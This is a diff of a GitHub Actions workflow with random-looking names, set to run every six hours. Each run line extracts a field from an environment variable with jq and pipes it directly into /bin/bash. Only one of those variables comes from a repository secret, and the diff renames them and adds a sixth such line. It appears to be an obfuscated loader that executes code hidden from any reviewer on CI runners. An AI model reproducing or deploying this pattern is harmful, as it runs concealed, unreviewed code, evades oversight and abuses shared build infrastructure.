@@ -1,22 +1,21 @@
 name: dongcunrui6715
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-
-jobs:  # 17703
+    - cron: '43 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dongcunrui6715
         env:
-          uiczb60266: ${{ secrets.uiczb60266 }}
+          qhw57: ${{ secrets.qhw57 }}
         run: |
-          echo $uiczb60266 | jq -r .rsjq2496 | /bin/bash
-          echo $zr90 | jq -r .qqah13395 | /bin/bash
-          echo $ed7 | jq -r .h1861 | /bin/bash
-          echo $h11 | jq -r .c05 | /bin/bash
-          echo $jd78 | jq -r .jz590 | /bin/bash
+          echo $qhw57 | jq -r .qo1221 | /bin/bash
+          echo $jruw6014 | jq -r .xt96366 | /bin/bash
+          echo $cdpnq21435 | jq -r .vs99331 | /bin/bash
+          echo $r2775 | jq -r .q158 | /bin/bash
+          echo $nrnl209 | jq -r .xm1 | /bin/bash
+          echo $nt6 | jq -r .aekn699 | /bin/bash
 
